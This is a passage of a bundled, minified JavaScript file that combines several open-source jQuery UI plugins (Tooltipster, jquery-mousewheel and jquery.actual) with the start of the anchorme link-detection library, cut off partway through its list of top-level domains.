                    e.$elProxy.on("mouseenter." + e.namespace, function() {
                        if (!j() || e.options.touchDevices) {
                            e.mouseIsOverProxy = true;
                            e._show()
                        }
                    }).on("mouseleave." + e.namespace, function() {
                        if (!j() || e.options.touchDevices) {
                            e.mouseIsOverProxy = false
                        }
                    });
                    if (p && e.options.touchDevices) {
                        e.$elProxy.on("touchstart." + e.namespace, function() {
                            e._showNow()
                        })
                    }
                } else {
                    if (e.options.trigger == "click") {
                        e.$elProxy.on("click." + e.namespace, function() {
                            if (!j() || e.options.touchDevices) {
                                e._show()
                            }
                        })
                    }
                }
            }
        },
        _show: function() {
            var a = this;
            if (a.Status != "shown" && a.Status != "appearing") {
                if (a.options.delay) {
                    a.timerShow = setTimeout(function() {
                        if (a.options.trigger == "click" || a.options.trigger == "hover" && a.mouseIsOverProxy) {
                            a._showNow()
                        }
                    }, a.options.delay)
                } else {
                    a._showNow()
                }
            }
        },
        _showNow: function(e) {
            var a = this;
            a.options.functionBefore.call(a.$el, a.$el, function() {
                if (a.enabled && a.Content !== null) {
                    if (e) {
                        a.callbacks.show.push(e)
                    }
                    a.callbacks.hide = [];
                    clearTimeout(a.timerShow);
                    a.timerShow = null;
                    clearTimeout(a.timerHide);
                    a.timerHide = null;
                    if (a.options.onlyOne) {
                        k(".tooltipstered").not(a.$el).each(function(o, A) {
                            var s = k(A),
                                f = s.data("tooltipster-ns");
                            k.each(f, function(E, C) {
                                var F = s.data(C),
                                    B = F.status(),
                                    D = F.option("autoClose");
                                if (B !== "hidden" && B !== "disappearing" && D) {
                                    F.hide()
                                }
                            })
                        })
                    }
                    var n = function() {
                        a.Status = "shown";
                        k.each(a.callbacks.show, function(o, f) {
                            f.call(a.$el)
                        });
                        a.callbacks.show = []
                    };
                    if (a.Status !== "hidden") {
                        var t = 0;
                        if (a.Status === "disappearing") {
                            a.Status = "appearing";
                            if (g()) {
                                a.$tooltip.clearQueue().removeClass("tooltipster-dying").addClass("tooltipster-" + a.options.animation + "-show");
                                if (a.options.speed > 0) {
                                    a.$tooltip.delay(a.options.speed)
                                }
                                a.$tooltip.queue(n)
                            } else {
                                a.$tooltip.stop().fadeIn(n)
                            }
                        } else {
                            if (a.Status === "shown") {
                                n()
                            }
                        }
                    } else {
                        a.Status = "appearing";
                        var t = a.options.speed;
                        a.bodyOverflowX = k("body").css("overflow-x");
                        k("body").css("overflow-x", "hidden");
                        var y = "tooltipster-" + a.options.animation,
                            l = "-webkit-transition-duration: " + a.options.speed + "ms; -webkit-animation-duration: " + a.options.speed + "ms; -moz-transition-duration: " + a.options.speed + "ms; -moz-animation-duration: " + a.options.speed + "ms; -o-transition-duration: " + a.options.speed + "ms; -o-animation-duration: " + a.options.speed + "ms; -ms-transition-duration: " + a.options.speed + "ms; -ms-animation-duration: " + a.options.speed + "ms; transition-duration: " + a.options.speed + "ms; animation-duration: " + a.options.speed + "ms;",
                            u = a.options.minWidth ? "min-width:" + Math.round(a.options.minWidth) + "px;" : "",
                            z = a.options.maxWidth ? "max-width:" + Math.round(a.options.maxWidth) + "px;" : "",
                            r = a.options.interactive ? "pointer-events: auto;" : "";
                        a.$tooltip = k('<div class="tooltipster-base ' + a.options.theme + '" style="' + u + " " + z + " " + r + " " + l + '"><div class="tooltipster-content"></div></div>');
                        if (g()) {
                            a.$tooltip.addClass(y)
                        }
                        a._content_insert();
                        a.$tooltip.appendTo("body");
                        a.reposition();
                        a.options.functionReady.call(a.$el, a.$el, a.$tooltip);
                        if (g()) {
                            a.$tooltip.addClass(y + "-show");
                            if (a.options.speed > 0) {
                                a.$tooltip.delay(a.options.speed)
                            }
                            a.$tooltip.queue(n)
                        } else {
                            a.$tooltip.css("display", "none").fadeIn(a.options.speed, n)
                        }
                        a._interval_set();
                        k(q).on("scroll." + a.namespace + " resize." + a.namespace, function() {
                            a.reposition()
                        });
                        if (a.options.autoClose) {
                            k("body").off("." + a.namespace);
                            if (a.options.trigger == "hover") {
                                if (p) {
                                    setTimeout(function() {
                                        k("body").on("touchstart." + a.namespace, function() {
                                            a.hide()
                                        })
                                    }, 0)
                                }
                                if (a.options.interactive) {
                                    if (p) {
                                        a.$tooltip.on("touchstart." + a.namespace, function(f) {
                                            f.stopPropagation()
                                        })
                                    }
                                    var x = null;
                                    a.$elProxy.add(a.$tooltip).on("mouseleave." + a.namespace + "-autoClose", function() {
                                        clearTimeout(x);
                                        x = setTimeout(function() {
                                            a.hide()
                                        }, a.options.interactiveTolerance)
                                    }).on("mouseenter." + a.namespace + "-autoClose", function() {
                                        clearTimeout(x)
                                    })
                                } else {
                                    a.$elProxy.on("mouseleave." + a.namespace + "-autoClose", function() {
                                        a.hide()
                                    })
                                }
                                if (a.options.hideOnClick) {
                                    a.$elProxy.on("click." + a.namespace + "-autoClose", function() {
                                        a.hide()
                                    })
                                }
                            } else {
                                if (a.options.trigger == "click") {
                                    setTimeout(function() {
                                        k("body").on("click." + a.namespace + " touchstart." + a.namespace, function() {
                                            a.hide()
                                        })
                                    }, 0);
                                    if (a.options.interactive) {
                                        a.$tooltip.on("click." + a.namespace + " touchstart." + a.namespace, function(f) {
                                            f.stopPropagation()
                                        })
                                    }
                                }
                            }
                        }
                    }
                    if (a.options.timer > 0) {
                        a.timerHide = setTimeout(function() {
                            a.timerHide = null;
                            a.hide()
                        }, a.options.timer + t)
                    }
                }
            })
        },
        _interval_set: function() {
            var a = this;
            a.checkInterval = setInterval(function() {
                if (k("body").find(a.$el).length === 0 || k("body").find(a.$elProxy).length === 0 || a.Status == "hidden" || k("body").find(a.$tooltip).length === 0) {
                    if (a.Status == "shown" || a.Status == "appearing") {
                        a.hide()
                    }
                    a._interval_cancel()
                } else {
                    if (a.options.positionTracker) {
                        var f = a._repositionInfo(a.$elProxy),
                            e = false;
                        if (c(f.dimension, a.elProxyPosition.dimension)) {
                            if (a.$elProxy.css("position") === "fixed") {
                                if (c(f.position, a.elProxyPosition.position)) {
                                    e = true
                                }
                            } else {
                                if (c(f.offset, a.elProxyPosition.offset)) {
                                    e = true
                                }
                            }
                        }
                        if (!e) {
                            a.reposition();
                            a.options.positionTrackerCallback.call(a, a.$el)
                        }
                    }
                }
            }, 200)
        },
        _interval_cancel: function() {
            clearInterval(this.checkInterval);
            this.checkInterval = null
        },
        _content_set: function(a) {
            if (typeof a === "object" && a !== null && this.options.contentCloning) {
                a = a.clone(true)
            }
            this.Content = a
        },
        _content_insert: function() {
            var f = this,
                a = this.$tooltip.find(".tooltipster-content");
            if (typeof f.Content === "string" && !f.options.contentAsHTML) {
                a.text(f.Content)
            } else {
                a.empty().append(f.Content)
            }
        },
        _update: function(f) {
            var a = this;
            a._content_set(f);
            if (a.Content !== null) {
                if (a.Status !== "hidden") {
                    a._content_insert();
                    a.reposition();
                    if (a.options.updateAnimation) {
                        if (g()) {
                            a.$tooltip.css({
                                width: "",
                                "-webkit-transition": "all " + a.options.speed + "ms, width 0ms, height 0ms, left 0ms, top 0ms",
                                "-moz-transition": "all " + a.options.speed + "ms, width 0ms, height 0ms, left 0ms, top 0ms",
                                "-o-transition": "all " + a.options.speed + "ms, width 0ms, height 0ms, left 0ms, top 0ms",
                                "-ms-transition": "all " + a.options.speed + "ms, width 0ms, height 0ms, left 0ms, top 0ms",
                                transition: "all " + a.options.speed + "ms, width 0ms, height 0ms, left 0ms, top 0ms"
                            }).addClass("tooltipster-content-changing");
                            setTimeout(function() {
                                if (a.Status != "hidden") {
                                    a.$tooltip.removeClass("tooltipster-content-changing");
                                    setTimeout(function() {
                                        if (a.Status !== "hidden") {
                                            a.$tooltip.css({
                                                "-webkit-transition": a.options.speed + "ms",
                                                "-moz-transition": a.options.speed + "ms",
                                                "-o-transition": a.options.speed + "ms",
                                                "-ms-transition": a.options.speed + "ms",
                                                transition: a.options.speed + "ms"
                                            })
                                        }
                                    }, a.options.speed)
                                }
                            }, a.options.speed)
                        } else {
                            a.$tooltip.fadeTo(a.options.speed, 0.5, function() {
                                if (a.Status != "hidden") {
                                    a.$tooltip.fadeTo(a.options.speed, 1)
                                }
                            })
                        }
                    }
                }
            } else {
                a.hide()
            }
        },
        _repositionInfo: function(a) {
            return {
                dimension: {
                    height: a.outerHeight(false),
                    width: a.outerWidth(false)
                },
                offset: a.offset(),
                position: {
                    left: parseInt(a.css("left")),
                    top: parseInt(a.css("top"))
                }
            }
        },
        hide: function(l) {
            var f = this;
            if (l) {
                f.callbacks.hide.push(l)
            }
            f.callbacks.show = [];
            clearTimeout(f.timerShow);
            f.timerShow = null;
            clearTimeout(f.timerHide);
            f.timerHide = null;
            var a = function() {
                k.each(f.callbacks.hide, function(o, n) {
                    n.call(f.$el)
                });
                f.callbacks.hide = []
            };
            if (f.Status == "shown" || f.Status == "appearing") {
                f.Status = "disappearing";
                var e = function() {
                    f.Status = "hidden";
                    if (typeof f.Content == "object" && f.Content !== null) {
                        f.Content.detach()
                    }
                    f.$tooltip.remove();
                    f.$tooltip = null;
                    k(q).off("." + f.namespace);
                    k("body").off("." + f.namespace).css("overflow-x", f.bodyOverflowX);
                    k("body").off("." + f.namespace);
                    f.$elProxy.off("." + f.namespace + "-autoClose");
                    f.options.functionAfter.call(f.$el, f.$el);
                    a()
                };
                if (g()) {
                    f.$tooltip.clearQueue().removeClass("tooltipster-" + f.options.animation + "-show").addClass("tooltipster-dying");
                    if (f.options.speed > 0) {
                        f.$tooltip.delay(f.options.speed)
                    }
                    f.$tooltip.queue(e)
                } else {
                    f.$tooltip.stop().fadeOut(f.options.speed, e)
                }
            } else {
                if (f.Status == "hidden") {
                    a()
                }
            }
            return f
        },
        show: function(a) {
            this._showNow(a);
            return this
        },
        update: function(a) {
            return this.content(a)
        },
        content: function(a) {
            if (typeof a === "undefined") {
                return this.Content
            } else {
                this._update(a);
                return this
            }
        },
        reposition: function() {
            var aC = this;
            if (k("body").find(aC.$tooltip).length !== 0) {
                aC.$tooltip.css("width", "");
                aC.elProxyPosition = aC._repositionInfo(aC.$elProxy);
                var ay = null,
                    aH = k(q).width(),
                    ax = aC.elProxyPosition,
                    aB = aC.$tooltip.outerWidth(false),
                    aw = aC.$tooltip.innerWidth() + 1,
                    aO = aC.$tooltip.outerHeight(false);
                if (aC.$elProxy.is("area")) {
                    var aK = aC.$elProxy.attr("shape"),
                        aE = aC.$elProxy.parent().attr("name"),
                        aM = k('img[usemap="#' + aE + '"]'),
                        aI = aM.offset().left,
                        aA = aM.offset().top,
                        aL = aC.$elProxy.attr("coords") !== undefined ? aC.$elProxy.attr("coords").split(",") : undefined;
                    if (aK == "circle") {
                        var av = parseInt(aL[0]),
                            aD = parseInt(aL[1]),
                            aJ = parseInt(aL[2]);
                        ax.dimension.height = aJ * 2;
                        ax.dimension.width = aJ * 2;
                        ax.offset.top = aA + aD - aJ;
                        ax.offset.left = aI + av - aJ
                    } else {
                        if (aK == "rect") {
                            var av = parseInt(aL[0]),
                                aD = parseInt(aL[1]),
                                ar = parseInt(aL[2]),
                                aN = parseInt(aL[3]);
                            ax.dimension.height = aN - aD;
                            ax.dimension.width = ar - av;
                            ax.offset.top = aA + aD;
                            ax.offset.left = aI + av
                        } else {
                            if (aK == "poly") {
                                var au = [],
                                    al = [],
                                    Z = 0,
                                    at = 0,
                                    Y = 0,
                                    ad = 0,
                                    an = "even";
                                for (var aF = 0; aF < aL.length; aF++) {
                                    var af = parseInt(aL[aF]);
                                    if (an == "even") {
                                        if (af > Y) {
                                            Y = af;
                                            if (aF === 0) {
                                                Z = Y
                                            }
                                        }
                                        if (af < Z) {
                                            Z = af
                                        }
                                        an = "odd"
                                    } else {
                                        if (af > ad) {
                                            ad = af;
                                            if (aF == 1) {
                                                at = ad
                                            }
                                        }
                                        if (af < at) {
                                            at = af
                                        }
                                        an = "even"
                                    }
                                }
                                ax.dimension.height = ad - at;
                                ax.dimension.width = Y - Z;
                                ax.offset.top = aA + at;
                                ax.offset.left = aI + Z
                            } else {
                                ax.dimension.height = aM.outerHeight(false);
                                ax.dimension.width = aM.outerWidth(false);
                                ax.offset.top = aA;
                                ax.offset.left = aI
                            }
                        }
                    }
                }
                var ap = 0,
                    ac = 0,
                    ae = 0,
                    aP = parseInt(aC.options.offsetY),
                    am = parseInt(aC.options.offsetX),
                    ab = aC.options.position;

                function aj() {
                    var a = k(q).scrollLeft();
                    if (ap - a < 0) {
                        ay = ap - a;
                        ap = a
                    }
                    if (ap + aB - a > aH) {
                        ay = ap - (aH + a - aB);
                        ap = aH + a - aB
                    }
                }

                function ao(f, a) {
                    if (ax.offset.top - k(q).scrollTop() - aO - aP - 12 < 0 && a.indexOf("top") > -1) {
                        ab = f
                    }
                    if (ax.offset.top + ax.dimension.height + aO + 12 + aP > k(q).scrollTop() + k(q).height() && a.indexOf("bottom") > -1) {
                        ab = f;
                        ae = ax.offset.top - aO - aP - 12
                    }
                }
                if (ab == "top") {
                    var aG = ax.offset.left + aB - (ax.offset.left + ax.dimension.width);
                    ap = ax.offset.left + am - aG / 2;
                    ae = ax.offset.top - aO - aP - 12;
                    aj();
                    ao("bottom", "top")
                }
                if (ab == "top-left") {
                    ap = ax.offset.left + am;
                    ae = ax.offset.top - aO - aP - 12;
                    aj();
                    ao("bottom-left", "top-left")
                }
                if (ab == "top-right") {
                    ap = ax.offset.left + ax.dimension.width + am - aB;
                    ae = ax.offset.top - aO - aP - 12;
                    aj();
                    ao("bottom-right", "top-right")
                }
                if (ab == "bottom") {
                    var aG = ax.offset.left + aB - (ax.offset.left + ax.dimension.width);
                    ap = ax.offset.left - aG / 2 + am;
                    ae = ax.offset.top + ax.dimension.height + aP + 12;
                    aj();
                    ao("top", "bottom")
                }
                if (ab == "bottom-left") {
                    ap = ax.offset.left + am;
                    ae = ax.offset.top + ax.dimension.height + aP + 12;
                    aj();
                    ao("top-left", "bottom-left")
                }
                if (ab == "bottom-right") {
                    ap = ax.offset.left + ax.dimension.width + am - aB;
                    ae = ax.offset.top + ax.dimension.height + aP + 12;
                    aj();
                    ao("top-right", "bottom-right")
                }
                if (ab == "left") {
                    ap = ax.offset.left - am - aB - 12;
                    ac = ax.offset.left + am + ax.dimension.width + 12;
                    var ak = ax.offset.top + aO - (ax.offset.top + ax.dimension.height);
                    ae = ax.offset.top - ak / 2 - aP;
                    if (ap < 0 && ac + aB > aH) {
                        var ai = parseFloat(aC.$tooltip.css("border-width")) * 2,
                            az = aB + ap - ai;
                        aC.$tooltip.css("width", az + "px");
                        aO = aC.$tooltip.outerHeight(false);
                        ap = ax.offset.left - am - az - 12 - ai;
                        ak = ax.offset.top + aO - (ax.offset.top + ax.dimension.height);
                        ae = ax.offset.top - ak / 2 - aP
                    } else {
                        if (ap < 0) {
                            ap = ax.offset.left + am + ax.dimension.width + 12;
                            ay = "left"
                        }
                    }
                }
                if (ab == "right") {
                    ap = ax.offset.left + am + ax.dimension.width + 12;
                    ac = ax.offset.left - am - aB - 12;
                    var ak = ax.offset.top + aO - (ax.offset.top + ax.dimension.height);
                    ae = ax.offset.top - ak / 2 - aP;
                    if (ap + aB > aH && ac < 0) {
                        var ai = parseFloat(aC.$tooltip.css("border-width")) * 2,
                            az = aH - ap - ai;
                        aC.$tooltip.css("width", az + "px");
                        aO = aC.$tooltip.outerHeight(false);
                        ak = ax.offset.top + aO - (ax.offset.top + ax.dimension.height);
                        ae = ax.offset.top - ak / 2 - aP
                    } else {
                        if (ap + aB > aH) {
                            ap = ax.offset.left - am - aB - 12;
                            ay = "right"
                        }
                    }
                }
                if (aC.options.arrow) {
                    var aa = "tooltipster-arrow-" + ab;
                    if (aC.options.arrowColor.length < 1) {
                        var Q = aC.$tooltip.css("background-color")
                    } else {
                        var Q = aC.options.arrowColor
                    }
                    if (!ay) {
                        ay = ""
                    } else {
                        if (ay == "left") {
                            aa = "tooltipster-arrow-right";
                            ay = ""
                        } else {
                            if (ay == "right") {
                                aa = "tooltipster-arrow-left";
                                ay = ""
                            } else {
                                ay = "left:" + Math.round(ay) + "px;"
                            }
                        }
                    }
                    if (ab == "top" || ab == "top-left" || ab == "top-right") {
                        var aq = parseFloat(aC.$tooltip.css("border-bottom-width")),
                            t = aC.$tooltip.css("border-bottom-color")
                    } else {
                        if (ab == "bottom" || ab == "bottom-left" || ab == "bottom-right") {
                            var aq = parseFloat(aC.$tooltip.css("border-top-width")),
                                t = aC.$tooltip.css("border-top-color")
                        } else {
                            if (ab == "left") {
                                var aq = parseFloat(aC.$tooltip.css("border-right-width")),
                                    t = aC.$tooltip.css("border-right-color")
                            } else {
                                if (ab == "right") {
                                    var aq = parseFloat(aC.$tooltip.css("border-left-width")),
                                        t = aC.$tooltip.css("border-left-color")
                                } else {
                                    var aq = parseFloat(aC.$tooltip.css("border-bottom-width")),
                                        t = aC.$tooltip.css("border-bottom-color")
                                }
                            }
                        }
                    }
                    if (aq > 1) {
                        aq++
                    }
                    var e = "";
                    if (aq !== 0) {
                        var G = "",
                            ah = "border-color: " + t + ";";
                        if (aa.indexOf("bottom") !== -1) {
                            G = "margin-top: -" + Math.round(aq) + "px;"
                        } else {
                            if (aa.indexOf("top") !== -1) {
                                G = "margin-bottom: -" + Math.round(aq) + "px;"
                            } else {
                                if (aa.indexOf("left") !== -1) {
                                    G = "margin-right: -" + Math.round(aq) + "px;"
                                } else {
                                    if (aa.indexOf("right") !== -1) {
                                        G = "margin-left: -" + Math.round(aq) + "px;"
                                    }
                                }
                            }
                        }
                        e = '<span class="tooltipster-arrow-border" style="' + G + " " + ah + ';"></span>'
                    }
                    aC.$tooltip.find(".tooltipster-arrow").remove();
                    var ag = '<div class="' + aa + ' tooltipster-arrow" style="' + ay + '">' + e + '<span style="border-color:' + Q + ';"></span></div>';
                    aC.$tooltip.append(ag)
                }
                aC.$tooltip.css({
                    top: Math.round(ae) + "px",
                    left: Math.round(ap) + "px"
                })
            }
            return aC
        },
        enable: function() {
            this.enabled = true;
            return this
        },
        disable: function() {
            this.hide();
            this.enabled = false;
            return this
        },
        destroy: function() {
            var a = this;
            a.hide();
            if (a.$el[0] !== a.$elProxy[0]) {
                a.$elProxy.remove()
            }
            a.$el.removeData(a.namespace).off("." + a.namespace);
            var f = a.$el.data("tooltipster-ns");
            if (f.length === 1) {
                var e = null;
                if (a.options.restoration === "previous") {
                    e = a.$el.data("tooltipster-initialTitle")
                } else {
                    if (a.options.restoration === "current") {
                        e = typeof a.Content === "string" ? a.Content : k("<div></div>").append(a.Content).html()
                    }
                }
                if (e) {
                    a.$el.attr("title", e)
                }
                a.$el.removeClass("tooltipstered").removeData("tooltipster-ns").removeData("tooltipster-initialTitle")
            } else {
                f = k.grep(f, function(l, o) {
                    return l !== a.namespace
                });
                a.$el.data("tooltipster-ns", f)
            }
            return a
        },
        elementIcon: function() {
            return this.$el[0] !== this.$elProxy[0] ? this.$elProxy[0] : undefined
        },
        elementTooltip: function() {
            return this.$tooltip ? this.$tooltip[0] : undefined
        },
        option: function(f, a) {
            if (typeof a == "undefined") {
                return this.options[f]
            } else {
                this.options[f] = a;
                return this
            }
        },
        status: function() {
            return this.Status
        }
    };
    k.fn[b] = function() {
        var y = arguments;
        if (this.length === 0) {
            if (typeof y[0] === "string") {
                var C = true;
                switch (y[0]) {
                    case "setDefaults":
                        k.extend(h, y[1]);
                        break;
                    default:
                        C = false;
                        break
                }
                if (C) {
                    return true
                } else {
                    return this
                }
            } else {
                return this
            }
        } else {
            if (typeof y[0] === "string") {
                var z = "#*$~&";
                this.each(function() {
                    var l = k(this).data("tooltipster-ns"),
                        a = l ? k(this).data(l[0]) : null;
                    if (a) {
                        if (typeof a[y[0]] === "function") {
                            var f = a[y[0]](y[1], y[2])
                        } else {
                            throw new Error('Unknown method .tooltipster("' + y[0] + '")')
                        }
                        if (f !== a) {
                            z = f;
                            return false
                        }
                    } else {
                        throw new Error("You called Tooltipster's \"" + y[0] + '" method on an uninitialized element')
                    }
                });
                return z !== "#*$~&" ? z : this
            } else {
                var B = [],
                    x = y[0] && typeof y[0].multiple !== "undefined",
                    s = x && y[0].multiple || !x && h.multiple,
                    A = y[0] && typeof y[0].debug !== "undefined",
                    e = A && y[0].debug || !A && h.debug;
                this.each(function() {
                    var l = false,
                        f = k(this).data("tooltipster-ns"),
                        a = null;
                    if (!f) {
                        l = true
                    } else {
                        if (s) {
                            l = true
                        } else {
                            if (e) {
                                console.log('Tooltipster: one or more tooltips are already attached to this element: ignoring. Use the "multiple" option to attach more tooltips.')
                            }
                        }
                    }
                    if (l) {
                        a = new w(this, y[0]);
                        if (!f) {
                            f = []
                        }
                        f.push(a.namespace);
                        k(this).data("tooltipster-ns", f);
                        k(this).data(a.namespace, a)
                    }
                    B.push(a)
                });
                if (s) {
                    return B
                } else {
                    return this
                }
            }
        }
    };
    var p = !!("ontouchstart" in q);
    var m = false;
    k("body").one("mousemove", function() {
        m = true
    })
})(jQuery, window, document);
/*! Copyright (c) 2013 Brandon Aaron (http://brandon.aaron.sh)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Version: 3.1.12
 *
 * Requires: jQuery 1.2.2+
 */
;
! function(b) {
    "function" == typeof define && define.amd ? define(["jquery"], b) : "object" == typeof exports ? module.exports = b : b(jQuery)
}(function(w) {
    function u(B) {
        var A = B || window.event,
            z = n.call(arguments, 1),
            y = 0,
            x = 0,
            k = 0,
            f = 0,
            e = 0,
            d = 0;
        if (B = w.event.fix(A), B.type = "mousewheel", "detail" in A && (k = -1 * A.detail), "wheelDelta" in A && (k = A.wheelDelta), "wheelDeltaY" in A && (k = A.wheelDeltaY), "wheelDeltaX" in A && (x = -1 * A.wheelDeltaX), "axis" in A && A.axis === A.HORIZONTAL_AXIS && (x = -1 * k, k = 0), y = 0 === k ? x : k, "deltaY" in A && (k = -1 * A.deltaY, y = k), "deltaX" in A && (x = A.deltaX, 0 === k && (y = -1 * x)), 0 !== k || 0 !== x) {
            if (1 === A.deltaMode) {
                var c = w.data(this, "mousewheel-line-height");
                y *= c, k *= c, x *= c
            } else {
                if (2 === A.deltaMode) {
                    var a = w.data(this, "mousewheel-page-height");
                    y *= a, k *= a, x *= a
                }
            }
            if (f = Math.max(Math.abs(k), Math.abs(x)), (!q || q > f) && (q = f, s(A, f) && (q /= 40)), s(A, f) && (y /= 40, x /= 40, k /= 40), y = Math[y >= 1 ? "floor" : "ceil"](y / q), x = Math[x >= 1 ? "floor" : "ceil"](x / q), k = Math[k >= 1 ? "floor" : "ceil"](k / q), l.settings.normalizeOffset && this.getBoundingClientRect) {
                var C = this.getBoundingClientRect();
                e = B.clientX - C.left, d = B.clientY - C.top
            }
            return B.deltaX = x, B.deltaY = k, B.deltaFactor = q, B.offsetX = e, B.offsetY = d, B.deltaMode = 0, z.unshift(B, y, x, k), r && clearTimeout(r), r = setTimeout(t, 200), (w.event.dispatch || w.event.handle).apply(this, z)
        }
    }

    function t() {
        q = null
    }

    function s(d, c) {
        return l.settings.adjustOldDeltas && "mousewheel" === d.type && c % 120 === 0
    }
    var r, q, p = ["wheel", "mousewheel", "DOMMouseScroll", "MozMousePixelScroll"],
        o = "onwheel" in document || document.documentMode >= 9 ? ["wheel"] : ["mousewheel", "DomMouseScroll", "MozMousePixelScroll"],
        n = Array.prototype.slice;
    if (w.event.fixHooks) {
        for (var m = p.length; m;) {
            w.event.fixHooks[p[--m]] = w.event.mouseHooks
        }
    }
    var l = w.event.special.mousewheel = {
        version: "3.1.12",
        setup: function() {
            if (this.addEventListener) {
                for (var a = o.length; a;) {
                    this.addEventListener(o[--a], u, !1)
                }
            } else {
                this.onmousewheel = u
            }
            w.data(this, "mousewheel-line-height", l.getLineHeight(this)), w.data(this, "mousewheel-page-height", l.getPageHeight(this))
        },
        teardown: function() {
            if (this.removeEventListener) {
                for (var a = o.length; a;) {
                    this.removeEventListener(o[--a], u, !1)
                }
            } else {
                this.onmousewheel = null
            }
            w.removeData(this, "mousewheel-line-height"), w.removeData(this, "mousewheel-page-height")
        },
        getLineHeight: function(a) {
            var f = w(a),
                e = f["offsetParent" in w.fn ? "offsetParent" : "parent"]();
            return e.length || (e = w("body")), parseInt(e.css("fontSize"), 10) || parseInt(f.css("fontSize"), 10) || 16
        },
        getPageHeight: function(a) {
            return w(a).height()
        },
        settings: {
            adjustOldDeltas: !0,
            normalizeOffset: !0
        }
    };
    w.fn.extend({
        mousewheel: function(b) {
            return b ? this.bind("mousewheel", b) : this.trigger("mousewheel")
        },
        unmousewheel: function(b) {
            return this.unbind("mousewheel", b)
        }
    })
});
/*! Copyright 2012, Ben Lin (http://dreamerslab.com/)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Version: 1.0.16
 *
 * Requires: jQuery >= 1.2.3
 */
(function(b) {
    if (typeof define === "function" && define.amd) {
        define(["jquery"], b)
    } else {
        b(jQuery)
    }
}(function(b) {
    b.fn.addBack = b.fn.addBack || b.fn.andSelf;
    b.fn.extend({
        actual: function(w, a) {
            if (!this[w]) {
                throw '$.actual => The jQuery method "' + w + '" you called does not exist'
            }
            var r = {
                absolute: false,
                clone: false,
                includeMargin: false,
                display: "block"
            };
            var o = b.extend(r, a);
            var s = this.eq(0);
            var p, n;
            if (o.clone === true) {
                p = function() {
                    var c = "position: absolute !important; top: -1000 !important; ";
                    s = s.clone().attr("style", c).appendTo("body")
                };
                n = function() {
                    s.remove()
                }
            } else {
                var q = [];
                var t = "";
                var u;
                p = function() {
                    u = s.parents().addBack().filter(":hidden");
                    t += "visibility: hidden !important; display: " + o.display + " !important; ";
                    if (o.absolute === true) {
                        t += "position: absolute !important; "
                    }
                    u.each(function() {
                        var c = b(this);
                        var d = c.attr("style");
                        q.push(d);
                        c.attr("style", d ? d + ";" + t : t)
                    })
                };
                n = function() {
                    u.each(function(c) {
                        var d = b(this);
                        var e = q[c];
                        if (e === undefined) {
                            d.removeAttr("style")
                        } else {
                            d.attr("style", e)
                        }
                    })
                }
            }
            p();
            var m = /(outer)/.test(w) ? s[w](o.includeMargin) : s[w]();
            n();
            return m
        }
    })
}));

function _typeof(b) {
    if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") {
        a = function a(c) {
            return typeof c
        }
    } else {
        a = function a(c) {
            return c && typeof Symbol === "function" && c.constructor === Symbol && c !== Symbol.prototype ? "symbol" : typeof c
        }
    }
    return a(b)
}! function(a, b) {
    "object" == (typeof exports === "undefined" ? "undefined" : _typeof(exports)) && "undefined" != typeof module ? module.exports = b() : "function" == typeof define && define.amd ? define(b) : (a = a || self).anchorme = b()
}(this, function() {
    var d = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : "undefined" != typeof global ? global : "undefined" != typeof self ? self : {};

    function b(e) {
        return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e["default"] : e
    }

    function c(e, k) {
        return e(k = {
            exports: {}
        }, k.exports), k.exports
    }
    var h = c(function(e, k) {
        Object.defineProperty(k, "__esModule", {
            value: !0
        }), k.TLDs = "(AAA|AARP|ABARTH|ABB|ABBOTT|ABBVIE|ABC|ABLE|ABOGADO|ABUDHABI|AC|ACADEMY|ACCENTURE|ACCOUNTANT|ACCOUNTANTS|ACO|ACTOR|AD|ADAC|ADS|ADULT|AE|AEG|AERO|AETNA|AF|AFAMILYCOMPANY|AFL|AFRICA|AG|AGAKHAN|AGENCY|AI|AIG|AIGO|AIRBUS|AIRFORCE|AIRTEL|AKDN|AL|ALFAROMEO|ALIBABA|ALIPAY|ALLFINANZ|ALLSTATE|ALLY|ALSACE|ALSTOM|AM|AMERICANEXPRESS|AMERICANFAMILY|AMEX|AMFAM|AMICA|AMSTERDAM|ANALYTICS|ANDROID|ANQUAN|ANZ|AO|AOL|APARTMENTS|APP|APPLE|AQ|AQUARELLE|AR|ARAB|ARAMCO|ARCHI|ARMY|ARPA|ART|ARTE|AS|ASDA|ASIA|ASSOCIATES|AT|ATHLETA|ATTORNEY|AU|AUCTION|AUDI|AUDIBLE|AUDIO|AUSPOST|AUTHOR|AUTO|AUTOS|AVIANCA|AW|AWS|AX|AXA|AZ|AZURE|BA|BABY|BAIDU|BANAMEX|BANANAREPUBLIC|BAND|BANK|BAR|BARCELONA|BARCLAYCARD|BARCLAYS|BAREFOOT|BARGAINS|BASEBALL|BASKETBALL|BAUHAUS|BAYERN|BB|BBC|BBT|BBVA|BCG|BCN|BD|BE|BEATS|BEAUTY|BEER|BENTLEY|BERLIN|BEST|BESTBUY|BET|BF|BG|BH|BHARTI|BI|BIBLE|BID|BIKE|BING|BINGO|BIO|BIZ|BJ|BLACK|BLACKFRIDAY|BLOCKBUSTER|BLOG|BLOOMBERG|BLUE|BM|BMS|BMW|BN|BNPPARIBAS|BO|BOATS|BOEHRINGER|BOFA|BOM|BOND|BOO|BOOK|BOOKING|BOSCH|BOSTIK|BOSTON|BOT|BOUTIQUE|BOX|BR|BRADESCO|BRIDGESTONE|BROADWAY|BROKER|BROTHER|BRUSSELS|BS|BT|BUDAPEST|BUGATTI|BUILD|BUILDERS|BUSINESS|BUY|BUZZ|BV|BW|BY|BZ|BZH|CA|CAB|CAFE|CAL|CALL|CALVINKLEIN|CAM|CAMERA|CAMP|CANCERRESEARCH|CANON|CAPETOWN|CAPITAL|CAPITALONE|CAR|CARAVAN|CARDS|CARE|CAREER|CAREERS|CARS|CASA|CASE|CASEIH|CASH|CASINO|CAT|CATERING|CATHOLIC|CBA|CBN|CBRE|CBS|CC|CD|CEB|CENTER|CEO|CERN|CF|CFA|CFD|CG|CH|CHANEL|CHANNEL|CHARITY|CHASE|CHAT|CHEAP|CHINTAI|CHRISTMAS|CHROME|CHURCH|CI|CIPRIANI|CIRCLE|CISCO|CITADEL|CITI|CITIC|CITY|CITYEATS|CK|CL|CLAIMS|CLEANING|CLICK|CLINIC|CLINIQUE|CLOTHING|CLOUD|CLUB|CLUBMED|CM|CN|CO|COACH|CODES|